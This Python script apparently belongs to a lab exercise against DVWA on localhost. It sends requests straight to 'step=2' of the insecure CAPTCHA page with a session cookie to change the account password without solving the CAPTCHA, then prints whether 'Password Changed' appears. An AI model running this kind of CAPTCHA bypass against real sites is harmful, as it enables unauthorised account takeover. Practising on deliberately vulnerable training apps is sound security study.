import requests

# Use the existing session cookie
cookies = {
    'PHPSESSID': '9kk32r8pdi340ch33to4hbg0s2',
    'security': 'low'
}

# Test the captcha page with GET
r = requests.get('http://127.0.0.1:8080/vulnerabilities/captcha/', cookies=cookies)
print("GET status:", r.status_code)
print("GET URL:", r.url)
print("Content length:", len(r.text))

# Look at the form - is it visible?
if 'style="display:none"' in r.text:
    print("Form is hidden (display:none)")
else:
    print("Form is visible")

# Check for pre tags
import re
pres = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
print("Pre tags (GET):", pres)

# Try POST with step=2
print("\n--- POST with step=2 ---")
r = requests.post('http://127.0.0.1:8080/vulnerabilities/captcha/', 
                  data={
                      'step': '2',
                      'password_new': 'test1234',
                      'password_conf': 'test1234',
                      'Change': 'Change'
                  },
                  cookies=cookies,
                  headers={'Content-Type': 'application/x-www-form-urlencoded'})
print("POST status:", r.status_code)
print("POST URL:", r.url)
print("Content length:", len(r.text))

# Check for Password Changed
if 'Password Changed' in r.text:
    print("SUCCESS! 'Password Changed' found in response")
    idx = r.text.index('Password Changed')
    print("Context:", repr(r.text[idx-100:idx+200]))
else:
    print("'Password Changed' NOT found")
    # Check for any pre tags
    pres = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    print("Pre tags:", pres)
    # Check for CAPTCHA incorrect
    if 'CAPTCHA was incorrect' in r.text:
        print("CAPTCHA was incorrect")
    # Check for "You passed the CAPTCHA"
    if 'You passed the CAPTCHA' in r.text:
        print("You passed the CAPTCHA")
    
    # Check if the form style changed
    if 'style="display:none"' in r.text:
        print("Form is hidden")
    else:
        print("Form is visible")

# Also try GET request with parameters as shown in help
print("\n--- GET with step=2 ---")
r = requests.get('http://127.0.0.1:8080/vulnerabilities/captcha/?step=2&password_new=test1234&password_conf=test1234&Change=Change', 
                 cookies=cookies)
print("GET status:", r.status_code)
if 'Password Changed' in r.text:
    print("SUCCESS! 'Password Changed' found in GET response")
else:
    print("'Password Changed' NOT found in GET response")

# Print raw response starting from body
print("\n--- RAW BODY (first 2000 chars) ---")
print(r.text[:2000])
